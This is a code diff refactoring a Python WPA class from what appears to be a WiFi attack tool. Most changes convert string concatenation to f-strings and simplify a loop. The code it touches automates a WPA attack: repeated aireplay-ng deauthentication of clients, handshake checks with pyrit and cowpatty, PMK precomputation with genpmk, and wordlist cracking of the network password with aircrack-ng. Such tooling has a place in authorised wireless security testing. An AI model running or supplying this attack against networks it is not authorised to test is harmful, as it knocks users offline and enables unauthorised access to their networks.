@@ -46,8 +46,18 @@ class WPA(EncryptionType):
 
         self.calculate_pmk()
 
-        pyrit_cmd = ['pyrit', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap', 'analyze']
-        cowpatty_cmd = ['cowpatty', '-c', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
+        pyrit_cmd = [
+            'pyrit',
+            '-r',
+            f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+            'analyze',
+        ]
+        cowpatty_cmd = [
+            'cowpatty',
+            '-c',
+            '-r',
+            f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+        ]
         de_auth_cmd = ['aireplay-ng', '-0', '5', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
         if self.silent_attack:
             super().show_message("Running silent attack (no de-authing)")
@@ -58,16 +68,14 @@ class WPA(EncryptionType):
         cowpatty_out = ""
 
         while not valid_handshake:
-            if not valid_handshake:
-                time.sleep(1)
-                if not self.silent_attack:
-                    if second_iterator == 7:
-                        self.show_message("de-authing . . .")
-                        out, err = self.execute_command(de_auth_cmd)
-                        second_iterator = 0
-                    else: second_iterator += 1
-            else:
-                break
+            time.sleep(1)
+            if not self.silent_attack:
+                if second_iterator == 7:
+                    self.show_message("de-authing . . .")
+                    out, err = self.execute_command(de_auth_cmd)
+                    second_iterator = 0
+                else:
+                    second_iterator += 1
             time.sleep(0.5)
             if self.is_pyrit_installed:
                 pyrit_out, err = self.execute_command(pyrit_cmd)
@@ -96,7 +104,7 @@ class WPA(EncryptionType):
             for pid in pids:
                 if pid != "":
                     self.execute_command(['kill', '-9', pid])  # kills all processes related with the process
-                    self.show_message("killed pid " + pid)
+                    self.show_message(f"killed pid {pid}")
 
     def get_status(self):
         return self.status
@@ -121,8 +129,15 @@ class WPA(EncryptionType):
         """
         if self.pmk != "":
             self.kill_genpmk()
-            cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r',
-                            self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
+            cowpatty_cmd = [
+                'cowpatty',
+                '-d',
+                self.pmk,
+                '-s',
+                self.essid,
+                '-r',
+                f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+            ]
             cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
             cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
             password = self.filter_cowpatty_psk(cowpatty_out)
@@ -132,9 +147,14 @@ class WPA(EncryptionType):
             else:
                 self.show_message("no password on pmk")
 
-        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                        '-w', self.wordlist, '>',
-                        self.write_directory + '/aicrack-out']
+        aircrack_cmd = [
+            'aircrack-ng',
+            f'{self.write_directory}/net_attack_{str(self.timestamp)}-01.cap',
+            '-w',
+            self.wordlist,
+            '>',
+            f'{self.write_directory}/aicrack-out',
+        ]
         aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
         aircrack_out = aircrack_out.decode('utf-8')
         self.password = self.filter_aircrack(aircrack_out)
@@ -148,7 +168,7 @@ class WPA(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        self.pmk = self.write_directory + '/pmk_' + str(self.timestamp)
+        self.pmk = f'{self.write_directory}/pmk_{str(self.timestamp)}'
         genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', self.pmk, '-s', self.essid]
         genpmk_thread = threading.Thread(target=self.execute_command, args=(genpmk_cmd,))
         genpmk_thread.start()
@@ -170,7 +190,7 @@ class WPA(EncryptionType):
             elif 'The PSK is' in line:
                 words = line.split(" ")
                 psk = words[3][1:-2]  # [1:-2] is to remove the " " surrounding the psk
-                self.show_message("Found PSK: " + psk)
+                self.show_message(f"Found PSK: {psk}")
                 return psk
         return ""
 
